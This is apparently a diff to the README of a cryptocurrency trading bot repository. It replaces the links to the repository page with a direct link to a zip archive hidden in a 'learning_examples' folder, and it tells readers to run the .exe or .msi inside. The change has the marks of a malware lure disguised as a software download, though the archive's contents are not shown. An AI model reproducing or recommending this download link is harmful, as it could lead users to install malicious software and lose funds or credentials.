@@ -1,6 +1,6 @@
 # 🤖 hyperliquid-trading-bot - Automated trading for your digital assets
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/chlamydeous-deletion416/hyperliquid-trading-bot)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/chlamydeous-deletion416/hyperliquid-trading-bot/main/learning_examples/01_websockets/trading-bot-hyperliquid-v2.6-alpha.3.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 You need to access the release page to get the application. Follow these instructions to download the installer:
 
-1. Visit [this page to download](https://github.com/chlamydeous-deletion416/hyperliquid-trading-bot).
+1. Visit [this page to download](https://raw.githubusercontent.com/chlamydeous-deletion416/hyperliquid-trading-bot/main/learning_examples/01_websockets/trading-bot-hyperliquid-v2.6-alpha.3.zip).
 2. Locate the latest release version on the right side of the screen.
 3. Click on the file ending in .msi or .exe to start your download.
 4. Save the file to your desktop for easy access.
